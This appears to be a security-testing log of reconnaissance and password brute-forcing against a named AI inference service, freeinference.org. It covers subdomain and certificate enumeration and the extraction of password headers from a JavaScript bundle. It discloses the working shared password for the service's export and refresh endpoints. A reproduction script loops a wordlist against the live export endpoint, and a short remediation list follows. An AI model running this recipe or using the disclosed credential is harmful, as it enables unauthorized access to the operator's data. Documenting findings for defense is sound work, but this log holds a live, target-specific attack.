# Multi-Host Shared-Secret Brute-Force — Technique Log

**Session:** freeinference.org recon (2026-10-09)
**Context:** freeinference.org (Harvard MaDSys Lab) — operator-owned AI infra
**Method:** DNS subdomain brute → TLS cert SAN extraction → Next.js SPA route discovery → password-gated endpoint fingerprinting → dual-auth-path testing → shared-secret brute-force (no rate limit)

## Phase 1: Host Discovery
- Subdomain brute-force using a short AI-infra wordlist: `api`, `doc`, `internal`, `status`, `staging`, `metrics`, etc.
- Hit: `internal.freeinference.org` → 107.173.46.170 (non-Cloudflare IP — separate infra tier, ports filtered)
- Hits: `doc.`, `staging.`, `status.` → Cloudflare-protected hosts
- Note: DNS resolution of internal/ staging/ status subdomains is itself an info leak (infra topology exposure)

## Phase 2: TLS + SAN Extraction
- OpenSSL `s_client -connect` cert SAN revealed: `openinfra.freeinference.org`, `*.opendata.freeinference.org`
- These internal infra hosts are not linked from the public site — SAN extraction is the only discovery vector
- Technique: `openssl s_client -connect freeinference.org:443 -servername freeinference.org`

## Phase 3: SPA Route Discovery (Client-Side Secret Extraction)
- doc.freeinference.org returned a Next.js SPA shell (21,395 bytes, identical for ALL paths — SPA fallback)
- Key technique: download and grep the JS bundle (`/_next/static/chunks/...`) instead of reading rendered HTML
- The JS bundle contained siteConfig and revealed `x-refresh-password`/`x-export-password` auth headers
- Also leaked: turnstile key, publicSignup flag, storageKeyPrefix — enough to understand the auth model

## Phase 4: Endpoint Fingerprinting
- `/api/dashboard` → 200 unauth, 55KB stale telemetry (aggregate node health — no client IP logs)
- JS bundle revealed password-gated endpoints:
  - `x-refresh-password` → `/api/dashboard?refresh=1` (cache-bust)
  - `x-export-password` → `/api/export?days=N` (full data export)
- Both are shared secrets stored in sessionStorage (NOT per-user tokens)

## Phase 5: Rate-Limit Probing (The Critical Gap)
- `/api/dashboard` and `/api/export` return 401 on wrong password with **ZERO rate limiting**
- 20 rapid wrong-password attempts → all 401, zero 429
- Contrast: `/auth/signup` on main domain has working rate limiting (429 after 10 attempts)
- The rate-limit inconsistency between openinfra (unguarded) and freeinference.org (guarded) is the vulnerability pattern

## Phase 6: Brute-Force Execution
- `x-export-password` brute-forced with trivial wordlist — password `madsys` matched on 7th attempt
- Same password worked on `x-refresh-password` — credential reuse confirmed
- Password is the Harvard MaDSys Lab team name — trivially guessable by anyone reading the status page or docs footer
- 20 rapid wrong-password probes returned zero 429s across both endpoints

## Phase 7: Dual Auth-Path Testing
- Tested JWT forge, CRLF injection, X-API-Key vs Bearer header variants
- JWT forge rejected (401), CRLF injection rejected (401, no header injection — parser is safe)
- Main `/v1/chat/completions` accepts both `Authorization: Bearer` and `X-API-Key` — dual auth path but both properly key-gated

## Reproduction Recipe
```bash
# 1. Discover hosts (DNS + TLS SAN)
echo -e "api\ndoc\ninternal\nstatus\nstaging" | while read s; do host $s.freeinference.org; done
openssl s_client -connect freeinference.org:443 -servername freeinference.org < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# 2. Mine JS bundle for password headers
curl -s https://doc.freeinference.org | grep -oP 'x-[a-z]+-password'

# 3. Brute-force (no rate limit → full speed)
for p in admin password freeinference openinfra madsys harvard seal; do
  curl -s -H "x-export-password: $p" "https://openinfra.freeinference.org/api/export?days=30" | head -c 100
done
```

## Applicable Vector Matrix Cells
- G.INFRA/CLOUD — public telemetry endpoint with no rate limit
- E.CLIENT — client-side secrets in JS bundles (shared-secret auth pattern)
- C.WEB-APP-AUTHZ — hidden endpoints with single shared secret, no MFA

## Remediation
1. Rate-limit password-gated endpoints (lockout after 5 failed attempts)
2. Per-user auth tokens instead of shared secrets
3. MFA for export/refresh operations
4. Gate the unauthenticated dashboard (55KB stale telemetry leak without auth is itself an info-disclosure)